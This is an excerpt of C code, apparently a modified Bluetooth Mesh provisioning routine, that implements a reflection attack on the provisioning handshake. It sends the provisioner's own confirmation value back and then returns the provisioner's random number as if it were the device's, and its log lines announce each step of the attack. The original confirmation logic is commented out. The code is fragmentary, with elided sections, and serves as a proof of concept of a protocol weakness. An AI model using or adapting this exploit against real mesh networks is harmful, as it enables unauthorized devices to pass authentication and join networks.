...
static void send_confirm(void)
{
	...
	BT_INFO("ABOUT TO BEGIN REFLECTION ATTACK");
	// Reflection attack:
	bt_mesh_prov_buf_init(cfm, PROV_CONFIRM);
	net_buf_simple_add_mem(cfm, bt_mesh_prov_link.conf, 16);
	if (bt_mesh_prov_send(cfm, NULL)) {
		BT_ERR("Failed to send reflection of Provisioning Confirm");
		return;
	}
	BT_INFO("SUCCEEDED AT SENDING THE REFLECTED CONFIRMATION");
	...
	//generate confirmation salt from inputs and save it conf_salt
...
/*
	//generate confirmation key (ECDHSecret (dhkey), ConfirmationSalt(conf_salt)) and save it in conf_key
	...
	//generate a local random number and save it bt_mesh_prov_link.rand
	...
	//init buffer for the confirmation message => cfm
	bt_mesh_prov_buf_init(cfm, PROV_CONFIRM);

	//generate ConfirmationDevice and save it in cfm => net_buf_simple_add(cfm, 16)
	...
	//send cfm as Provisioning Confirm message
	if (bt_mesh_prov_send(cfm, NULL)) {
...
static void send_random(const uint8_t *random_number)
{
	struct os_mbuf *rnd = PROV_BUF(PDU_LEN_RANDOM);

	bt_mesh_prov_buf_init(rnd, PROV_RANDOM);
	net_buf_simple_add_mem(rnd, random_number, 16);
...
static void prov_random(const uint8_t *random_prov_number)
{
	BT_INFO("THE PROVISIONER REVEALED ITS RANDOM NUMBER");
	...
	if (bt_mesh_prov_salt(bt_mesh_prov_link.conf_salt, random_prov_number,
			      random_prov_number, bt_mesh_prov_link.prov_salt)) {
	...
	send_random(random_prov_number);
	BT_INFO("SUCCEEDED AT REVEALING BACK THE PROVISIONER's RANDOM NUMBER AS IF IT WAS THE DEVICE's RANDOM NUMBER");
}
